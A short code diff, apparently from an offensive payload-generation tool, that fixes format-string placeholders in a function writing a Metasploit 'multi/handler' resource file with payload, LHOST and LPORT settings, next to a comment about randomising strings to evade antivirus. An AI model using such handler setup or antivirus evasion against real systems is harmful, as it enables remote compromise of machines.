@@ -427,7 +427,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
 
     # write out rc file
     write_file(
-        "unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
+        "unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
 
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
